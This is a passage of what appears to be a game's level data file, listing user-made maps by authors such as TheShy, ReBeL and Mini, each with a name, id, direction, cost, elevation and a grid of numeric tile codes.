0,0,183,0,0,199,183,0,0,0,183,0,183,183,183,183,199,0,183,0,0,0,183,0,0,199,183,0,0,0,183,0,183,2,2]});
maps.push({name="Where are we going",author="TheShy",id="#1701105107",direction="forward",cost=200,elevation=0,map=[93,93,0,0,0,0,187,25,25,2,2,25,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,25,25,25,25,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,25,25,25,25,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,0,0,0,0,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,27,183,183,183,183,27,186,0,0,0,0,93,93,93,93,0,0,0,0,187,29,183,183,183,183,29,186,0,0,0,0,93,93,93,93,0,0,0,0,187,31,183,183,183,183,31,186,0,0,0,0,93,93,93,93,0,0,0,0,187,33,183,183,183,183,33,186,0,0,0,0,93,93,38,38,186,0,0,0,187,35,183,183,183,183,35,186,0,0,0,187,38,38,145,38,183,187,37,183,187,37,183,183,183,183,37,186,183,37,186,183,38,145,145,38,183,187,37,183,187,37,183,183,183,183,37,186,183,37,186,183,38,145,38,38,186,0,0,0,187,35,183,183,183,183,35,186,0,0,0,187,38,38,93,93,0,0,0,0,187,33,183,183,183,183,33,186,0,0,0,0,93,93,93,93,0,0,0,0,187,31,183,183,183,183,31,186,0,0,0,0,93,93,93,93,0,0,0,0,187,29,183,183,183,183,29,186,0,0,0,0,93,93,93,93,0,0,0,0,187,27,183,183,183,183,27,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,0,0,0,0,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,25,25,25,25,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,25,25,25,25,25,186,0,0,0,0,93,93,93,93,0,0,0,0,187,25,25,2,2,25,25,186,0,0,0,0,93,93]});
maps.push({name="fys gaowan liangye",author="TheShy",id="#1701786094",direction="left",cost=316,elevation=1,map=[41,41,40,39,38,37,36,35,34,33,32,31,30,29,28,27,26,25,2,2,41,41,40,39,38,37,36,35,34,33,32,31,30,29,28,27,26,25,25,145,40,40,183,41,183,39,183,37,183,35,183,33,183,31,183,29,183,27,183,25,39,39,43,145,41,145,39,145,37,145,35,145,33,145,31,145,29,145,27,145,38,38,183,43,183,41,183,39,183,37,183,35,183,33,183,31,183,29,183,27,37,37,41,145,43,145,41,145,39,145,37,145,35,145,33,145,31,145,29,145,36,36,183,41,183,43,183,41,183,39,183,37,183,35,183,33,183,31,183,29,35,35,39,145,41,145,43,145,41,145,39,145,37,145,35,145,33,145,31,145,34,34,183,39,183,41,183,43,183,41,183,39,183,37,183,35,183,33,183,31,33,33,37,145,39,145,41,145,43,145,41,145,39,145,37,145,35,145,33,145,32,32,183,37,183,39,183,41,183,43,183,41,183,39,183,37,183,35,183,33,31,31,35,145,37,145,39,145,41,145,43,145,41,145,39,145,37,145,35,145,30,30,183,35,183,37,183,39,183,41,183,43,183,41,183,39,183,37,183,35,29,29,33,145,35,145,37,145,39,145,41,145,43,145,41,145,39,145,37,145,28,28,183,33,183,35,183,37,183,39,183,41,183,43,183,41,183,39,93,37,27,27,31,145,33,145,35,145,37,145,39,145,41,145,43,145,41,145,39,145,26,26,183,31,183,33,183,35,183,37,183,39,183,41,183,43,93,41,93,39,2,145,29,145,31,145,33,145,35,145,37,145,39,145,41,145,43,145,41,145,2,27,183,29,183,31,183,33,183,35,183,37,183,39,93,41,93,43,93,41,25,145,27,145,29,145,31,145,33,145,35,145,37,145,39,145,41,145,43,145]});
maps.push({name="ff gaowan heiquan",author="TheShy",id="#1715935265",direction="right",cost=122,elevation=0,map=[170,39,186,0,0,0,0,0,0,2,2,0,0,0,0,0,0,187,39,170,175,39,186,0,0,0,0,0,0,34,34,0,0,0,0,0,0,187,39,176,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,180,39,186,0,0,0,0,0,0,31,31,0,0,0,0,0,0,187,39,181,170,39,186,0,0,0,0,0,0,30,30,0,0,0,0,0,0,187,39,170,0,0,0,0,0,0,0,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,170,39,186,0,0,0,0,0,0,25,25,0,0,0,0,0,0,187,39,170,174,39,186,0,0,0,0,0,0,3,3,0,0,0,0,0,0,187,39,173,93,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,2,93,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,2,179,39,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,39,178,170,39,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,187,39,170]});
maps.push({name="Abandonend ts one",author="ReBeL",id="#1740978851",direction="right",cost=380,elevation=13,map=[0,0,0,105,2,2,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,0,102,0,108,107,106,106,0,0,0,1,1,1,1,0,0,0,0,0,0,121,122,0,109,0,0,106,0,0,109,109,109,97,1,99,120,120,1,120,120,121,120,0,109,141,141,0,0,109,109,1,1,1,1,1,1,1,1,120,120,0,120,0,109,109,109,1,1,109,1,1,0,0,120,120,120,1,1,4,4,0,127,0,109,1,109,75,109,109,1,0,0,0,120,1,120,1,1,112,112,0,0,0,109,1,110,110,110,1,1,0,0,0,120,1,120,1,1,65,65,0,0,0,1,1,96,96,96,96,1,118,0,0,0,1,0,0,0,0,0,0,0,0,109,1,110,110,141,141,144,77,77,120,1,1,1,1,1,1,1,0,0,0,1,1,1,1,117,117,118,81,81,120,101,119,1,1,1,1,1,0,0,0,109,94,94,1,75,118,0,0,76,120,1,119,1,1,1,1,1,65,65,0,109,109,144,1,117,118,0,0,76,120,101,119,119,144,119,119,112,65,65,0,0,109,144,1,141,118,0,0,118,120,1,119,75,75,75,119,3,112,112,0,0,109,93,1,109,118,118,118,118,120,101,119,75,75,75,119,119,119,119,0,0,109,109,96,0,120,120,120,120,120,1,119,75,75,75,119,75,75,75,0,0,0,0,0,0,1,101,1,101,1,1,119,118,118,118,118,75,119,119,0,0,1,1,1,119,119,119,119,119,119,75,75,75,75,75,118,119,118,2,0,0,0,0,0,1,1,1,1,1,1,119,119,75,75,75,118,118,119,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119]});
maps.push({name="dont die 2 this pls",author="ReBeL",id="#1741042146",direction="forward",cost=662,elevation=0,map=[2,2,0,0,94,94,199,199,199,132,27,27,27,28,101,110,144,144,144,144,105,105,105,105,105,105,1,1,1,27,27,27,27,28,101,110,90,144,90,144,105,105,105,105,105,105,1,1,1,101,101,101,27,28,101,110,144,144,144,144,1,1,1,1,105,105,1,1,1,26,26,1,27,28,101,110,144,144,144,144,1,127,105,105,105,105,105,1,26,26,26,1,102,28,101,110,45,90,144,90,1,0,0,105,105,105,105,1,26,26,26,1,1,1,1,1,45,45,45,45,1,0,1,1,96,96,1,1,1,26,82,82,173,82,45,1,45,45,45,45,1,0,1,111,3,3,111,82,1,26,82,82,168,82,45,1,80,80,80,80,1,0,1,111,111,111,111,82,1,26,82,82,82,82,45,1,5,45,5,5,1,4,96,111,110,110,84,82,1,26,82,82,82,82,45,1,5,45,45,5,1,97,96,110,109,84,84,80,1,26,82,82,174,82,45,1,80,80,80,80,199,199,199,1,84,84,84,80,1,26,82,82,82,82,45,1,80,80,80,5,105,80,105,1,1,106,106,106,98,26,82,82,82,82,45,1,80,80,45,5,105,1,80,80,105,105,105,105,98,26,82,82,82,82,45,1,80,80,80,80,80,1,1,1,1,1,1,1,1,26,84,84,80,80,45,1,80,45,80,80,105,80,105,105,1,105,105,99,98,26,84,84,80,80,45,1,80,5,5,5,1,1,1,82,1,80,105,1,1,1,1,1,91,91,1,1,80,80,5,5,1,1,105,82,1,82,105,1,1,1,1,1,45,45,1,93,45,45,80,80,1,1,105,82,82,82,105,1,1,1,1,1,45,45,1,45,45,45,5,5,1,1,1,105,105,105,105,1,1,1,1,1,131,93,1,45,45,45,2,2]});
maps.push({name="The Sun",author="Mini",id="#1741190385",direction="forward",cost=215,elevation=17,map=[0,0,0,0,0,0,0,0,0,0,38,0,0,0,0,0,199,2,2,199,0,0,0,0,0,0,0,0,0,100,133,94,0,0,0,0,199,27,27,199,0,0,0,0,37,0,0,0,0,37,37,37,0,0,0,0,199,131,27,199,0,0,0,37,89,37,0,0,0,0,0,0,0,37,38,93,199,199,199,199,0,0,37,38,93,38,37,0,0,37,37,37,0,0,37,38,0,0,0,0,0,0,0,37,89,37,0,0,37,37,36,37,37,0,0,37,0,0,0,0,0,0,0,0,37,0,0,37,37,36,0,36,37,37,0,0,0,0,0,0,0,0,0,0,0,0,37,37,36,0,34,0,36,37,37,0,0,0,0,0,0,0,0,0,0,37,37,36,0,34,33,34,0,36,37,37,0,37,100,0,0,94,37,0,37,37,36,0,34,33,132,33,34,0,36,37,0,37,133,38,38,133,37,0,37,36,0,34,33,132,33,34,0,36,37,37,0,37,94,0,0,100,37,0,37,37,36,0,34,33,34,0,36,37,37,0,0,0,0,0,0,0,0,0,0,37,37,36,0,34,0,36,37,37,0,0,0,0,0,0,0,0,0,0,0,0,37,37,36,0,36,37,37,0,0,37,0,0,0,0,0,0,0,0,37,0,0,37,37,36,37,37,0,0,37,89,37,0,0,0,0,0,0,0,38,37,0,0,37,37,37,0,0,37,38,93,38,37,0,0,199,199,199,199,93,38,37,0,0,0,0,0,0,0,37,89,37,0,0,0,199,44,134,199,0,0,0,0,37,37,37,0,0,0,0,37,0,0,0,0,199,44,44,199,0,0,0,0,94,133,100,0,0,0,0,0,0,0,0,0,199,2,2,199,0,0,0,0,0,38,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Fast or Faster",author="Mini",id="#1741192367",direction="left",cost=183,elevation=-7,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,24,24,24,24,1,0,0,41,41,0,0,0,0,0,0,0,0,0,1,0,24,24,24,24,1,0,41,41,41,41,41,41,40,0,0,44,44,44,44,24,24,24,24,24,0,0,41,41,41,41,41,41,40,0,0,44,44,44,44,24,24,24,24,24,0,0,0,41,41,41,0,0,0,0,0,0,0,0,1,0,23,23,23,23,1,0,0,41,41,0,0,0,0,0,0,0,0,0,1,0,23,23,23,23,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,0,0,0,36,36,0,0,0,0,0,0,0,21,21,21,21,22,22,22,22,0,0,0,37,37,0,0,0,0,0,0,0,21,21,21,21,22,22,22,22,0,1,1,37,37,1,1,0,0,0,0,0,21,21,21,21,22,22,22,22,0,0,0,17,17,0,0,0,0,0,0,0,21,21,21,21,22,22,22,22,0,17,17,17,17,18,18,18,19,19,19,19,20,20,20,20,0,0,0,0,0,2,17,17,17,18,18,18,19,19,19,19,20,20,20,20,0,0,0,0,0,2,17,17,17,18,18,18,19,19,19,19,20,20,20,20,0,0,0,0,0,17,17,17,17,18,18,18,19,19,19,19,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="How To Resist 101",author="Mini",id="#1741195871",direction="forward",cost=236,elevation=0,map=[1,1,1,1,9,94,9,9,9,2,2,9,9,9,94,9,1,1,1,1,1,82,83,9,9,9,94,9,9,9,9,9,9,94,9,9,9,84,82,1,1,82,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,82,1,1,82,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,82,1,1,76,0,0,0,0,0,0,0,173,9,0,0,0,0,0,0,0,76,1,131,9,9,0,0,0,0,0,0,0,188,0,0,0,0,0,0,9,9,133,9,9,9,0,9,186,0,0,0,0,0,0,0,0,187,9,0,9,9,9,9,9,0,0,177,170,0,0,0,0,0,0,0,0,0,175,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,132,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,134,132,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,134,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,176,0,0,0,0,0,0,0,0,0,0,174,0,0,9,9,9,9,9,0,9,186,0,0,0,0,0,0,0,0,187,9,0,9,9,9,134,9,9,0,0,0,0,0,0,189,0,0,0,0,0,0,0,9,9,132,1,82,0,0,0,0,0,0,0,9,178,0,0,0,0,0,0,0,82,1,1,82,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,82,1,1,82,0,0,0,1,1,9,9,9,9,9,9,1,1,0,0,0,82,1,1,84,76,9,96,109,109,9,9,9,9,9,9,109,109,96,9,76,83,1,1,1,1,1,96,109,109,9,9,2,2,9,9,109,109,96,1,1,1,1]});
maps.push({name="RACE Railway",author="Mini",id="#1741197127",direction="forward",cost=198,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,25,25,25,25,25,25,25,25,25,25,5,5,5,5,0,0,0,5,5,5,25,25,25,25,25,25,25,25,25,25,5,5,5,5,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,25,25,26,27,27,27,27,27,27,26,25,25,5,5,5,0,0,5,5,5,25,25,26,27,27,27,27,27,27,26,25,25,5,5,5,0,0,5,5,5,25,25,26,27,27,27,27,27,27,26,25,25,5,5,5,0,0,5,5,5,25,25,26,27,27,27,27,27,27,26,25,25,5,5,5,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,5,5,5,5,25,25,25,25,25,25,25,25,25,25,5,5,5,0,0,0,5,5,5,5,25,25,25,25,25,25,25,25,25,25,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Casual Difficulty",author="Mini",id="#1741198656",direction="right",cost=314,elevation=15,map=[9,2,2,9,0,0,0,0,13,90,13,13,0,0,0,0,20,20,90,19,9,9,9,9,0,0,0,0,13,13,94,13,0,0,0,0,20,93,19,90,9,9,9,9,0,0,0,0,90,94,13,13,0,0,0,0,20,20,93,20,9,9,9,90,0,0,0,0,13,13,13,13,0,0,0,0,20,20,20,20,9,9,9,9,0,0,22,22,22,22,22,22,22,22,22,0,0,0,0,0,9,9,9,9,0,0,22,22,90,22,22,22,22,90,22,17,90,90,17,17,9,9,9,9,0,0,22,138,22,22,137,22,22,138,90,17,17,134,17,17,90,131,131,9,0,0,90,22,22,22,22,22,22,22,22,17,17,17,17,17,9,90,9,90,0,0,22,22,22,90,22,90,22,22,22,17,17,17,17,17,9,9,9,9,0,0,0,4,0,0,0,0,0,0,0,17,90,17,17,17,0,0,0,13,13,90,13,13,13,13,13,0,0,0,0,90,17,17,17,17,0,0,0,13,13,13,13,13,90,13,13,0,0,0,0,90,17,17,17,90,0,0,0,13,133,13,132,132,13,133,13,0,0,0,0,17,17,136,17,17,0,0,0,13,13,13,13,13,13,13,13,0,0,0,0,17,17,17,90,17,0,0,0,90,13,13,13,13,13,90,13,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,90,24,24,24,24,0,0,0,0,0,19,19,19,19,0,90,24,139,24,24,24,24,24,24,2,0,0,0,0,0,19,19,94,19,0,24,24,139,24,24,24,24,24,24,2,0,0,0,0,0,90,94,19,19,0,90,24,24,90,24,24,24,90,24,24,0,0,0,0,0,19,19,90,19,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Ups n Downs",author="Mini",id="#1741199230",direction="forward",cost=156,elevation=0,map=[0,0,0,0,0,0,9,9,2,2,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,9,9,9,9,0,0,9,9,0,0,9,9,9,9,0,0,0,0,0,0,9,9,9,0,0,0,29,29,0,0,0,9,9,9,0,0,0,0,0,0,9,9,9,0,0,0,28,28,0,0,0,9,9,9,0,0,0,0,0,0,0,29,29,0,0,0,27,27,0,0,0,29,29,0,0,0,0,0,0,0,0,30,30,0,0,0,26,26,0,0,0,30,30,0,0,0,0,0,0,0,0,31,31,0,0,0,25,25,0,0,0,31,31,0,0,0,0,0,0,0,0,32,32,0,0,0,25,25,0,0,0,32,32,0,0,0,0,0,0,0,0,32,32,0,0,0,25,25,0,0,0,32,32,0,0,0,0,0,0,0,0,31,31,0,0,0,25,25,0,0,0,31,31,0,0,0,0,0,0,0,0,30,30,0,0,0,26,26,0,0,0,30,30,0,0,0,0,0,0,0,0,29,29,0,0,0,27,27,0,0,0,29,29,0,0,0,0,0,0,0,9,9,9,0,0,0,28,28,0,0,0,9,9,9,0,0,0,0,0,0,9,9,9,0,0,0,29,29,0,0,0,9,9,9,0,0,0,0,0,0,9,9,9,9,0,0,9,9,0,0,9,9,9,9,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,2,2,9,9,0,0,0,0,0,0,0,0]});
maps.push({name="David vs someone",author="ReBeL",id="#1741210442",direction="forward",cost=475,elevation=-2,map=[22,22,22,22,86,2,2,86,1,1,1,1,1,1,1,1,1,1,1,1,22,22,22,22,86,7,7,86,1,11,11,11,11,97,1,132,18,18,18,134,3,22,22,91,86,7,7,86,1,11,0,0,0,0,1,18,18,18,18,18,0,22,22,91,42,42,42,42,0,11,22,22,22,0,1,0,0,0,0,0,0,22,22,91,7,7,7,7,1,11,0,0,0,0,1,0,0,0,0,0,36,22,22,22,7,7,7,7,1,11,11,1,1,18,1,0,3,3,0,0,91,22,22,22,7,3,3,7,1,11,11,18,18,18,1,0,19,19,0,0,16,16,16,16,11,11,11,11,11,11,11,18,18,18,1,0,0,0,0,0,90,16,3,96,11,11,89,89,86,89,11,18,18,18,1,0,0,0,0,0,90,16,16,96,11,11,90,86,89,90,11,18,18,18,1,9,9,9,0,0,16,3,16,16,11,11,11,11,11,11,11,18,18,18,1,65,65,9,0,0,199,38,199,18,18,18,18,18,18,18,18,18,18,18,1,65,65,9,0,0,199,98,199,18,18,18,18,18,18,18,18,18,18,18,1,65,65,9,0,0,18,18,18,18,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9,9,9,9,1,9,9,9,98,98,98,91,91,91,91,91,102,1,9,9,99,9,9,9,1,9,9,9,98,98,91,91,91,91,91,91,91,1,3,3,66,66,66,66,69,66,66,66,66,66,66,66,66,66,1,1,1,1,18,18,66,66,66,66,69,66,66,66,66,66,66,66,66,66,1,131,133,1,5,5,66,66,66,66,69,66,66,66,66,66,66,66,66,66,1,9,9,1,65,65,1,1,1,1,1,9,9,9,98,101,101,101,101,101,9,9,9,1,2,2]});
maps.push({name="whateveritscalled",author="ReBeL",id="#1741214501",direction="right",cost=471,elevation=-19,map=[2,2,24,24,24,23,23,21,21,21,19,19,13,13,91,91,91,1,1,1,24,24,24,24,24,23,23,21,21,21,19,19,13,13,91,91,94,1,1,1,1,1,4,4,4,4,4,4,11,14,19,19,94,5,5,91,94,1,1,1,1,1,5,5,5,5,5,5,11,14,19,19,94,5,5,91,91,1,1,1,1,1,5,5,5,5,5,5,11,14,14,14,5,5,5,91,1,1,1,1,1,1,5,5,5,5,5,5,11,11,11,11,5,5,5,1,1,1,1,1,1,1,5,5,6,6,6,5,5,5,5,5,5,90,90,1,1,1,1,1,1,1,5,5,6,97,6,5,5,5,5,5,5,90,90,1,1,1,1,1,1,1,1,90,6,6,6,5,5,5,5,5,5,5,5,1,1,1,1,1,1,8,93,1,90,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,8,104,8,1,96,96,96,96,96,96,96,96,96,96,1,1,1,1,1,1,8,8,8,1,90,5,5,5,5,5,5,5,90,1,1,1,1,1,1,1,0,0,0,0,1,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,0,0,0,0,1,5,90,90,90,90,90,5,1,1,1,1,1,1,1,1,8,8,1,1,1,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,0,0,1,90,39,3,184,184,184,184,184,40,102,1,1,1,1,5,5,1,0,0,1,6,6,6,6,6,5,5,5,40,93,1,1,1,1,5,2,90,8,8,7,7,7,7,7,6,5,5,5,5,90,90,1,1,1,5,2,90,8,8,8,8,8,8,7,6,90,90,5,5,5,5,103,105,101,5,5,91,144,144,8,90,90,8,7,6,90,90,5,5,5,5,103,105,101,5,5]});
maps.push({name="Half Life",author="ReBeL",id="#1741214803",direction="forward",cost=268,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,8,94,8,8,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,8,94,8,8,8,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,8,8,8,8,8,8,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,144,144,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,144,144,144,144,8,8,8,144,144,144,144,0,0,0,0,0,0,0,0,0,0,0,0,144,144,8,8,8,8,8,144,144,0,0,0,0,0,0,0,0,0,0,0,144,144,144,144,8,8,8,8,144,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,144,8,8,8,144,0,0,0,0,0,7,0,7,7,7,0,0,0,0,144,144,144,8,8,8,0,0,0,0,0,7,0,7,0,7,0,0,0,0,144,144,144,144,8,8,0,0,0,0,0,7,0,7,0,7,0,0,0,0,144,144,144,144,8,8,0,0,0,0,0,7,7,7,0,7,0,0,0,0,144,144,144,8,8,0,0,0,0,0,0,0,0,0,0,93,0,5,5,0,3,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="3 way WOW",author="ReBeL",id="#1741216803",direction="forward",cost=310,elevation=1,map=[20,20,20,20,144,144,0,0,0,0,0,0,0,2,2,0,0,0,0,0,20,20,20,20,20,144,0,0,0,0,0,0,0,12,12,0,0,0,0,0,20,20,199,90,20,20,0,0,0,0,0,0,0,12,12,0,0,0,0,0,20,90,199,199,90,20,20,20,20,0,0,0,0,12,12,0,0,0,0,0,20,144,199,199,199,90,20,20,20,3,0,0,0,12,12,0,0,0,0,0,20,90,199,199,199,199,90,20,20,0,0,0,0,12,12,0,0,0,0,0,20,20,199,199,199,199,199,199,199,199,0,0,12,12,12,12,12,0,0,0,199,20,199,0,0,0,0,0,101,0,0,12,12,12,12,12,12,12,0,0,20,20,199,0,0,0,0,0,101,0,12,12,12,12,0,12,12,12,12,0,20,20,199,0,0,0,0,0,101,12,12,12,12,0,0,0,12,12,12,12,82,82,199,0,0,0,0,0,101,12,12,12,0,0,0,0,127,127,127,127,76,76,199,0,0,0,0,13,101,12,12,0,0,0,0,0,0,0,0,0,40,40,199,0,0,0,13,13,101,101,101,101,101,0,0,0,0,0,0,0,94,40,0,0,0,13,102,13,12,0,0,0,0,0,0,0,0,0,0,0,93,40,0,0,65,13,13,12,0,0,0,0,0,0,0,0,0,0,0,0,199,199,199,65,65,13,12,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,96,13,13,13,0,0,0,0,0,0,0,0,0,0,3,3,3,3,13,13,96,96,97,13,0,0,0,0,13,13,13,0,0,0,13,13,13,13,101,101,101,96,13,13,0,0,13,13,0,0,0,13,13,0,13,13,13,13,2,2,101,96,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,94]});
maps.push({name="thats a ton of ladde",author="ReBeL",id="#1741217353",direction="forward",cost=412,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,23,144,3,3,3,3,3,3,3,3,3,3,3,3,144,23,0,0,0,0,23,3,11,11,11,11,11,11,11,11,11,11,11,11,3,23,0,0,0,0,23,3,11,144,3,3,3,3,3,3,3,3,144,11,3,23,0,0,0,0,23,3,11,3,8,8,8,8,8,8,8,8,3,11,3,23,0,0,0,91,23,3,11,3,8,144,3,3,3,3,144,8,3,11,3,23,0,0,0,91,23,3,11,3,8,3,5,5,5,5,3,8,3,11,3,23,0,0,94,91,23,3,11,3,8,3,5,93,100,5,3,8,3,11,3,23,0,0,94,91,23,3,11,3,8,3,5,100,93,5,3,8,3,11,3,23,0,0,0,91,23,3,11,3,8,3,5,5,5,5,3,8,3,11,3,23,0,0,0,91,23,3,11,3,8,144,3,3,3,3,144,8,3,11,3,23,0,0,0,0,23,3,11,3,8,8,8,8,8,8,8,8,3,11,3,23,0,0,0,0,23,3,11,144,3,3,3,3,3,3,3,3,144,11,3,23,0,0,0,0,23,3,11,11,11,11,11,11,11,11,11,11,11,11,3,23,0,0,0,0,23,3,144,3,3,3,3,3,3,3,3,3,3,3,144,23,0,0,0,0,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Island To Island",author="FroZRil",id="#1741220871",direction="forward",cost=187,elevation=9,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,90,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,5,5,5,130,130,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,0,0,0,130,130,130,0,0,0,0,0,0,0,0,0,9,9,9,130,0,0,0,0,0,130,9,9,9,0,0,0,0,0,0,9,65,65,65,9,1,1,109,1,1,9,65,65,65,9,0,0,0,0,0,9,65,93,65,9,109,94,89,93,109,9,65,94,65,9,0,0,0,0,0,9,65,65,65,9,1,1,109,1,1,9,65,65,65,9,0,0,0,0,0,0,9,9,9,130,0,0,0,0,0,130,9,9,9,0,0,0,0,0,0,0,0,0,130,130,130,0,0,0,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,130,130,14,14,14,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,90,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
